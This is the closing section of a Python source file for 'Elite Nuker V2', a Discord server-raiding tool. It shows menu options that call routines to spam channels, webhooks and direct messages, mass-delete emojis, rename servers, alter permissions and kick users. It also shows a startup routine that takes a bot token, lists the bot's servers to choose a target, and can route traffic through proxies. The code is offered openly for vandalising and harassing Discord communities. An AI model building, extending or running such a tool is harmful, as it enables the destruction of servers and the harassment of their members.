                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "8":
                try:
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    emojis = []
                    for i in range(amount):
                        emoji = input("{}({}Elite{}) Emoji ID {}{}: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", i+1))
                        emojis.append(emoji)
                    self.execute_mass_delete_emojis(guildid, emojis, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "9":
                try:
                    name = input("{}({}Elite{}) Channel Name{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    type = int(input("{}({}Elite{}) Type (0=text, 2=voice, 4=category){}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.execute_spam_channels(guildid, name, type, amount, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "10":
                try:
                    webhook_url = input("{}({}Elite{}) Webhook URL{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_webhook_spam(webhook_url, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "11":
                try:
                    new_name = input("{}({}Elite{}) New Guild Name{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_change_guild_name(guildid, new_name, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "12":
                try:
                    icon_url = input("{}({}Elite{}) Icon URL{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_change_guild_icon(guildid, icon_url, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "13":
                try:
                    channel_id = input("{}({}Elite{}) Channel ID{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_channel_permissions(channel_id, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "14":
                try:
                    userid = input("{}({}Elite{}) User ID{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    content = input("{}({}Elite{}) Message Content{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_mass_dm(userid, content, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "15":
                try:
                    userid = input("{}({}Elite{}) User ID{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_voice_kick(guildid, userid, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "16":
                try:
                    userid = input("{}({}Elite{}) User ID{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    nickname = input("{}({}Elite{}) New Nickname{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    self.execute_change_nick(guildid, userid, nickname, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "17":
                try:
                    self.fetch_guilds(token)
                except:
                    print("{}({}-{}) Error fetching guilds".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "18":
                try:
                    content = input("{}({}Elite{}) Message to spam in all channels{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    amount = int(input("{}({}Elite{}) Number of times to spam{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.execute_spam_all_channels(guildid, content, amount, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            
            elif ans == "19":
                print("{}({}Elite{}) Checking for updates...".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                time.sleep(2)
                print("{}({}Elite{}) You are using the latest version (v{})".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", VERSION))
            
            elif ans == "20":
                print("{}({}Elite{})".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                print("    Elite Nuker V2")
                print("    Developed by Tavish")
                print("    Version: {}".format(VERSION))
                print("    Enhanced by Qoder")
                print("    Thanks for using Elite Nuker!")
                print("{}".format("\x1b[0m"))
                time.sleep(3)
                            
            elif ans == "21":
                print("{}({}Elite{}) Exiting...".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                time.sleep(1.5)
                os._exit(0)
            
            else:
                print("{}({}!{}) Invalid option".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                time.sleep(1.5)
                
            # Pause to let user see results before returning to menu (except for exit option)
            if ans != "21":
                input("\nPress Enter to return to main menu...")
            


def run_menu():
    time.sleep(1.5)
    elite_nuker = Elite()
    try:
        elite_nuker.menu()
    except KeyboardInterrupt:
        print("\n{}({}!{}) Exited by user".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
    except Exception as e:
        print("{}({}-{}) Error: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))

async def on_ready():
    print("{}({}Elite{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", f"{client.user.name}#{client.user.discriminator}"))
    # Run the menu in a separate thread to avoid blocking the event loop
    import threading
    menu_thread = threading.Thread(target=run_menu, daemon=True)
    menu_thread.start()

if __name__ == "__main__":
    try:
        os.system("title Elite Nuker ^| Authentication & mode con: cols=95 lines=25")
        token = input(f"{Fore.CYAN}[{Fore.GREEN}TOKEN{Fore.CYAN}]: {Style.RESET_ALL}")
        os.system("cls") if os.name == "nt" else os.system("clear")
        
        # Automatically fetch the first guild the bot is in
        import httpx
        import json
        
        # Create client with proper intents
        client = commands.Bot(command_prefix="+", help_command=None, intents=intents)
        proxy = "http://" + next(proxies) if config["proxy"] == True else None
        session = httpx.Client(proxies=proxy)
        
        # Get guilds the bot is in
        response = session.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
        if response.status_code == 200:
            guilds = response.json()
            if guilds:
                print(f"{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] Guilds you're in:")
                for i, guild in enumerate(guilds):
                    print(f"  [{i+1}] {guild['name']} (ID: {guild['id']})")
                
                while True:
                    try:
                        choice = int(input(f"{Fore.CYAN}[{Fore.GREEN}GUILD{Fore.CYAN}]: {Style.RESET_ALL}"))
                        if 1 <= choice <= len(guilds):
                            global guildid
                            guildid = guilds[choice-1]['id']
                            print(f"{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] Selected guild: {guilds[choice-1]['name']} (ID: {guildid})")
                            break
                        else:
                            print(f"{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Please enter a number between 1 and {len(guilds)}")
                    except ValueError:
                        print(f"{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Please enter a valid number")
            else:
                print(f"{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Bot is not in any guilds")
                exit(1)
        else:
            print(f"{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Failed to fetch guilds")
            exit(1)
        
        # Assign the event handler to the client
        client.event(on_ready)
        client.run(token)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)